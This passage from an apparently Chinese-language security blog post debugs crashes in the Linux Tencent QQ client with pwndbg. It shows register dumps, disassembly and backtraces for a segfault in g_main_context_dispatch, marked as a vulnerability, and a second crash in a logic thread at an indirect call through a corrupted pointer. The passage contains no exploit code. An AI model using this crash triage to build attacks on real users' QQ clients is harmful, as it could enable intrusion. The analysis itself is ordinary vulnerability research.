je     0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;</span><br><span class="line">│   0x7ffff7ce49e1 &lt;g_main_context_dispatch+577&gt;    mov    rdi,QWORD PTR [rsp]</span><br><span class="line">│   0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   QWORD PTR [rbx+0x8]     &#x2F;&#x2F;vul</span><br><span class="line">│   0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi,r14</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x55555615200d    call   g_main_context_iteration@plt &lt;0x5555570a28c0&gt;</span><br><span class="line">       rdi: 0x3acdd361fdc0 ◂— 0x0</span><br><span class="line">       rsi: 0x0</span><br><span class="line">       rdx: 0x7fffffffffffffff</span><br><span class="line">       rcx: 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp</span><br></pre></td></tr></table></figure>





<h2 id="调试漏洞函数最后一次状态"><a href="#调试漏洞函数最后一次状态" class="headerlink" title="调试漏洞函数最后一次状态"></a>调试漏洞函数最后一次状态</h2><p>崩溃前</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x317f3a79dc01 ◂— 0x0</span><br><span class="line"> RCX  0x7fffffffdac0 —▸ 0x317f3a79dc68 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x317f3a648dc0 ◂— 0x0</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x317f3a5c8003 ◂— 0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x286</span><br><span class="line"> R12  0x7fffffffdce8 ◂— &#39;2.0.0-b2&#39;</span><br><span class="line"> R13  0x7fffffffdc80 —▸ 0x317f3a79dc70 —▸ 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x317f3a7b8090 —▸ 0x5555570bc718 —▸ 0x555556151e10 ◂— push   rbp</span><br><span class="line"> RBP  0x7fffffffdb00 —▸ 0x7fffffffdb30 —▸ 0x7fffffffdbc0 —▸ 0x7fffffffdf10 —▸ 0x55555709abe0 ◂— ...</span><br><span class="line"> RSP  0x7fffffffdab8 —▸ 0x555556152012 ◂— mov    rcx, qword ptr [r15 + 8]</span><br><span class="line"> RIP  0x7ffff7ce3100 (g_main_context_iteration) ◂— push   r12</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce3100 &lt;g_main_context_iteration&gt;       push   r12</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>最后一次崩溃g_main_context_iteration的传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x317f3a79dc01 ◂— 0x0</span><br><span class="line"> RCX  0x7fffffffdac0 —▸ 0x317f3a79dc68 —▸ 0x5555570bdcb0 —▸ 0x55555617bf10 ◂— push   rbp</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x317f3a648dc0 ◂— 0x0</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x317f3a5c8003 ◂— 0x0</span><br><span class="line"> R9   0x0  ; diff</span><br><span class="line"> R10  0x17 ; diff</span><br><span class="line"> R11  0x10 ; diff</span><br><span class="line"> R12  0x7fffffffdce8 ◂— &#39;2.0.0-b2&#39;</span><br><span class="line"> R13  0x7fffffffdc80 —▸ 0x317f3a79dc70 —▸ 0x5555570bdd00 —▸ 0x55555617bf20 ◂— push   rbp</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x317f3a7b8090 —▸ 0x5555570bc718 —▸ 0x555556151e10 ◂— push   rbp</span><br><span class="line"> RBP  0x7fffffffdb00 —▸ 0x7fffffffdb30 —▸ 0x7fffffffdbc0 —▸ 0x7fffffffdf10 —▸ 0x55555709abe0 ◂— ...</span><br><span class="line"> RSP  0x7fffffffdab8 —▸ 0x555556152012 ◂— mov    rcx, qword ptr [r15 + 8]</span><br><span class="line"> RIP  0x7ffff7ce3100 (g_main_context_iteration) ◂— push   r12</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce3100 &lt;g_main_context_iteration&gt;       push   r12</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7ce3105 &lt;g_main_context_iteration+5&gt;     push   rbp</span><br><span class="line">   0x7ffff7ce3106 &lt;g_main_context_iteration+6&gt;     mov    rbp, rdi</span><br><span class="line">   0x7ffff7ce3109 &lt;g_main_context_iteration+9&gt;     sub    rsp, 8</span><br><span class="line">   0x7ffff7ce310d &lt;g_main_context_iteration+13&gt;    test   rdi, rdi</span><br></pre></td></tr></table></figure>



<p>g_main_context_dispatch函数最后一次崩溃传参</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;qq&quot; hit Breakpoint 2, 0x00007ffff7ce47a0 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0                                                                   </span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────</span><br><span class="line"> RAX  0x1</span><br><span class="line"> RBX  0x1</span><br><span class="line"> RCX  0xf0950bcdd20 ◂— 0x0</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0xf094fee6dc0 ◂— 0x0</span><br><span class="line"> RSI  0x1</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7fffffffd840 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x293</span><br><span class="line"> R12  0x3</span><br><span class="line"> R13  0xf094fee6dc0 ◂— 0x0</span><br><span class="line"> R14  0x7fffffffda10 ◂— 0x352</span><br><span class="line"> R15  0x2</span><br><span class="line"> RBP  0xf095048bf20 ◂— 0x100000021 /* &#x27;!&#x27; */</span><br><span class="line"> RSP  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c0</span><br><span class="line"> RIP  0x7ffff7ce47a0 (g_main_context_dispatch) ◂— push   r15</span><br><span class="line">───────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce47a0 &lt;g_main_context_dispatch&gt;       push   r15</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7ce47a4 &lt;g_main_context_dispatch+4&gt;     mov    r14, rdi</span><br><span class="line">   0x7ffff7ce47a7 &lt;g_main_context_dispatch+7&gt;     push   r13</span><br><span class="line">   0x7ffff7ce47a9 &lt;g_main_context_dispatch+9&gt;     push   r12</span><br><span class="line">   0x7ffff7ce47ab &lt;g_main_context_dispatch+11&gt;    push   rbp</span><br><span class="line">   0x7ffff7ce47ac &lt;g_main_context_dispatch+12&gt;    push   rbx</span><br><span class="line">   0x7ffff7ce47ad &lt;g_main_context_dispatch+13&gt;    sub    rsp, 0x68</span><br><span class="line">   0x7ffff7ce47b1 &lt;g_main_context_dispatch+17&gt;    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x7ffff7ce47ba &lt;g_main_context_dispatch+26&gt;    mov    qword ptr [rsp + 0x58], rax</span><br><span class="line">   0x7ffff7ce47bf &lt;g_main_context_dispatch+31&gt;    xor    eax, eax</span><br><span class="line">   0x7ffff7ce47c1 &lt;g_main_context_dispatch+33&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;</span><br><span class="line">────────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c0</span><br><span class="line">01:0008│      0x7fffffffd9e0 ◂— 0x352</span><br><span class="line">02:0010│      0x7fffffffd9e8 ◂— 0x249b1fe8</span><br><span class="line">03:0018│      0x7fffffffd9f0 ◂— 0x100000000</span><br><span class="line">04:0020│      0x7fffffffd9f8 —▸ 0x7ffff7cead90 (g_poll) ◂— mov    esi, esi</span><br><span class="line">05:0028│      0x7fffffffda00 ◂— 0xaaaaaaaaaaaaaaaa</span><br><span class="line">06:0030│      0x7fffffffda08 ◂— 0x0</span><br><span class="line">07:0038│ r14  0x7fffffffda10 ◂— 0x352</span><br><span class="line">──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7ce47a0 g_main_context_dispatch</span><br><span class="line">   f 1     7ffff7d38621</span><br><span class="line">   f 2     7ffff7ce3131 g_main_context_iteration+49</span><br><span class="line">   f 3     555556152012</span><br><span class="line">   f 4     55555617d0e5</span><br><span class="line">   f 5     5555561660ee</span><br><span class="line">   f 6     555555f0f6f4</span><br><span class="line">   f 7     7ffff6f70152 __libc_start_main+242</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;qq&quot; hit Breakpoint 2, 0x00007ffff7ce47a0 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0                                                                   </span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────</span><br><span class="line"> RAX  0x1</span><br><span class="line"> RBX  0x1</span><br><span class="line"> RCX  0x4 ;diff</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0xf094fee6dc0 ◂— 0x0</span><br><span class="line"> RSI  0x1</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7fffffffd840 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x293</span><br><span class="line"> R12  0x3</span><br><span class="line"> R13  0xf094fee6dc0 ◂— 0x0</span><br><span class="line"> R14  0x7fffffffda10 ◂— 0x353 ; diff ++</span><br><span class="line"> R15  0x2</span><br><span class="line"> RBP  0xf095048bf20 ◂— 0x100000021 /* &#x27;!&#x27; */</span><br><span class="line"> RSP  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c0</span><br><span class="line"> RIP  0x7ffff7ce47a0 (g_main_context_dispatch) ◂— push   r15</span><br><span class="line">───────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce47a0 &lt;g_main_context_dispatch&gt;       push   r15</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7ce47a4 &lt;g_main_context_dispatch+4&gt;     mov    r14, rdi</span><br><span class="line">   0x7ffff7ce47a7 &lt;g_main_context_dispatch+7&gt;     push   r13</span><br><span class="line">   0x7ffff7ce47a9 &lt;g_main_context_dispatch+9&gt;     push   r12</span><br><span class="line">   0x7ffff7ce47ab &lt;g_main_context_dispatch+11&gt;    push   rbp</span><br><span class="line">   0x7ffff7ce47ac &lt;g_main_context_dispatch+12&gt;    push   rbx</span><br><span class="line">   0x7ffff7ce47ad &lt;g_main_context_dispatch+13&gt;    sub    rsp, 0x68</span><br><span class="line">   0x7ffff7ce47b1 &lt;g_main_context_dispatch+17&gt;    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">   0x7ffff7ce47ba &lt;g_main_context_dispatch+26&gt;    mov    qword ptr [rsp + 0x58], rax</span><br><span class="line">   0x7ffff7ce47bf &lt;g_main_context_dispatch+31&gt;    xor    eax, eax</span><br><span class="line">   0x7ffff7ce47c1 &lt;g_main_context_dispatch+33&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;</span><br><span class="line">────────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffd9d8 —▸ 0x7ffff7d38621 ◂— jmp    0x7ffff7d384c0</span><br><span class="line">01:0008│      0x7fffffffd9e0 ◂— 0x353</span><br><span class="line">02:0010│      0x7fffffffd9e8 ◂— 0x15108cf6</span><br><span class="line">03:0018│      0x7fffffffd9f0 ◂— 0x100000000</span><br><span class="line">04:0020│      0x7fffffffd9f8 —▸ 0x7ffff7cead90 (g_poll) ◂— mov    esi, esi</span><br><span class="line">05:0028│      0x7fffffffda00 ◂— 0xaaaaaaaaaaaaaaaa</span><br><span class="line">06:0030│      0x7fffffffda08 ◂— 0x0</span><br><span class="line">07:0038│ r14  0x7fffffffda10 ◂— 0x353</span><br><span class="line">──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7ce47a0 g_main_context_dispatch</span><br><span class="line">   f 1     7ffff7d38621</span><br><span class="line">   f 2     7ffff7ce3131 g_main_context_iteration+49</span><br><span class="line">   f 3     555556152012</span><br><span class="line">   f 4     55555617d0e5</span><br><span class="line">   f 5     5555561660ee</span><br><span class="line">   f 6     555555f0f6f4</span><br><span class="line">   f 7     7ffff6f70152 __libc_start_main+242</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;qq&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x7ffff7000000 (____wcstof128_l_internal+1168) ◂— adc    eax, 0x748b0000</span><br><span class="line"> RCX  0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */</span><br><span class="line"> RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1</span><br><span class="line"> RDI  0xf09506b6740 ◂— 0xfffff0f400000002</span><br><span class="line"> RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]</span><br><span class="line"> R8   0xf094fee8520 ◂— 0x0</span><br><span class="line"> R9   0x7fffffffd850 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x286</span><br><span class="line"> R12  0x1</span><br><span class="line"> R13  0xf0950489980 ◂— 0x0</span><br><span class="line"> R14  0xf094fee6dc0 ◂— 0x0</span><br><span class="line"> R15  0x2</span><br><span class="line"> RBP  0xf0950b47d20 —▸ 0xf09506b6740 ◂— 0xfffff0f400000002</span><br><span class="line"> RSP  0x7fffffffd940 —▸ 0xf09506b6740 ◂— 0xfffff0f400000002</span><br><span class="line"> RIP  0x7ffff7ce49e5 (g_main_context_dispatch+581) ◂— call   qword ptr [rbx + 8]</span><br><span class="line">───────────────────────────────────────[ DISASM ]────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]</span><br><span class="line">        rdi: 0xf09506b6740 ◂— 0xfffff0f400000002</span><br><span class="line">        rsi: 0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]</span><br><span class="line">        rdx: 0x7ffff7e450a0 (__pthread_keys) ◂— 0x1</span><br><span class="line">        rcx: 0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */</span><br><span class="line"> </span><br><span class="line">   0x7ffff7ce49e8 &lt;g_main_context_dispatch+584&gt;    mov    rdi, r14</span><br><span class="line">   0x7ffff7ce49eb &lt;g_main_context_dispatch+587&gt;    call   g_mutex_lock &lt;0x7ffff7d32250&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7ce49f1 &lt;g_main_context_dispatch+593&gt;    mov    edx, dword ptr [rsp + 0x2c]</span><br><span class="line">   0x7ffff7ce49f5 &lt;g_main_context_dispatch+597&gt;    mov    eax, dword ptr [rbp + 0x2c]</span><br><span class="line">   0x7ffff7ce49f8 &lt;g_main_context_dispatch+600&gt;    test   edx, edx</span><br><span class="line">   0x7ffff7ce49fa &lt;g_main_context_dispatch+602&gt;    jne    g_main_context_dispatch+610 &lt;0x7ffff7ce4a02&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7ce49fc &lt;g_main_context_dispatch+604&gt;    and    eax, 0xfffffffd</span><br><span class="line">   0x7ffff7ce49ff &lt;g_main_context_dispatch+607&gt;    mov    dword ptr [rbp + 0x2c], eax</span><br><span class="line">   0x7ffff7ce4a02 &lt;g_main_context_dispatch+610&gt;    and    eax, 0x41</span><br><span class="line">   0x7ffff7ce4a05 &lt;g_main_context_dispatch+613&gt;    cmp    eax, 0x41</span><br><span class="line">────────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffd940 —▸ 0xf09506b6740 ◂— 0xfffff0f400000002</span><br><span class="line">01:0008│      0x7fffffffd948 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffd950 —▸ 0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */</span><br><span class="line">03:0018│      0x7fffffffd958 ◂— 0xc646f4bc63</span><br><span class="line">04:0020│      0x7fffffffd960 —▸ 0x7ffff7d42760 ◂— &#x27;(unnamed)&#x27;</span><br><span class="line">05:0028│      0x7fffffffd968 ◂— 0x1</span><br><span class="line">06:0030│      0x7fffffffd970 ◂— 0x0</span><br><span class="line">07:0038│      0x7fffffffd978 —▸ 0x555555c44670 ◂— push   rbp</span><br><span class="line">──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7ce49e5 g_main_context_dispatch+581</span><br><span class="line">   f 1     7ffff7d38621</span><br><span class="line">   f 2     7ffff7ce3131 g_main_context_iteration+49</span><br><span class="line">   f 3     555556152012</span><br><span class="line">   f 4     55555617d0e5</span><br><span class="line">   f 5     5555561660ee</span><br><span class="line">   f 6     555555f0f6f4</span><br><span class="line">   f 7     7ffff6f70152 __libc_start_main+242</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>





<p>0x527A0  + 581 == x529e5</p>
<h2 id="其他线程漏洞"><a href="#其他线程漏洞" class="headerlink" title="其他线程漏洞"></a>其他线程漏洞</h2><p>经过多线程调试, 找到bug2, 发生在Qnox_LogicThrea线程中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line"></span><br><span class="line">Thread 5 &quot;Qnox_LogicThrea&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x000055555621f539 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────</span><br><span class="line"> RAX  0xffffc39f73c44bb8</span><br><span class="line"> RBX  0x3c62263bf000 ◂— 0x0</span><br><span class="line"> RCX  0x55555621f500 ◂— push   rbp</span><br><span class="line"> RDX  0xf0</span><br><span class="line"> RDI  0x7ffff515f830 ◂— 0xaaaaaaaaaaaaaaaa</span><br><span class="line"> RSI  0x3c622690f240 ◂— 0xffffc39f73c44bb8</span><br><span class="line"> R8   0x3c62264ca003 ◂— 0x0</span><br><span class="line"> R9   0x1</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x286</span><br><span class="line"> R12  0x0</span><br><span class="line"> R13  0xaaaaaaaaaaaaaaaa</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x3c62267d3000 —▸ 0x5555570c4350 —▸ 0x55555621d7d0 ◂— push   rbp</span><br><span class="line"> RBP  0x7ffff515f870 —▸ 0x7ffff515f930 —▸ 0x7ffff515fa10 —▸ 0x7ffff515fa60 —▸ 0x7ffff515fac0 ◂— ...</span><br><span class="line"> RSP  0x7ffff515f6e0 ◂— 0x0</span><br><span class="line"> RIP  0x55555621f539 ◂— call   qword ptr [rax + 0x30]</span><br><span class="line">─────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────</span><br><span class="line"> ► 0x55555621f539    call   qword ptr [rax + 0x30]</span><br><span class="line"> </span><br><span class="line">   0x55555621f53c    mov    edi, 2</span><br><span class="line">   0x55555621f541    call   0x55555614f1b0</span><br><span class="line"> </span><br><span class="line">   0x55555621f546    test   al, al</span><br><span class="line">   0x55555621f548    je     0x55555621f5de</span><br><span class="line"> </span><br><span class="line">   0x55555621f54e    lea    rsi, [rip - 0xb59197]</span><br><span class="line">   0x55555621f555    lea    rdi, [rbp - 0x178]</span><br><span class="line">   0x55555621f55c    mov    edx, 0x107</span><br><span class="line">   0x55555621f561    mov    ecx, 2</span><br><span class="line">   0x55555621f566    call   0x55555614f2a0</span><br><span class="line"> </span><br><span class="line">   0x55555621f56b    lea    rdi, [rbp - 0x170]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到, call   qword ptr [rax + 0x30]指令中, rax对应的值为: 0xffffc39f73c44bb8</p>
<p>指令: 0x55555 621f539 -  0x55555 5554000 == 0xccb539</p>
<p>vmmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x555555554000     0x555555b69000 r--p   615000 0      &#x2F;opt&#x2F;tencent-qq&#x2F;qq</span><br><span class="line">   0x555555b69000     0x5555570a6000 r-xp  153d000 614000 &#x2F;opt&#x2F;tencent-qq&#x2F;qq</span><br><span class="line">   0x5555570a6000     0x55555710d000 r--p    67000 1b50000 &#x2F;opt&#x2F;tencent-qq&#x2F;qq</span><br><span class="line">   0x55555710d000     0x555557119000 rw-p     c000 1bb6000 &#x2F;opt&#x2F;tencent-qq&#x2F;qq</span><br><span class="line">   0x555557119000     0x55555717a000 rw-p    61000 0      [heap]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在0xccb539处找到call    qword ptr [rax+30h]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 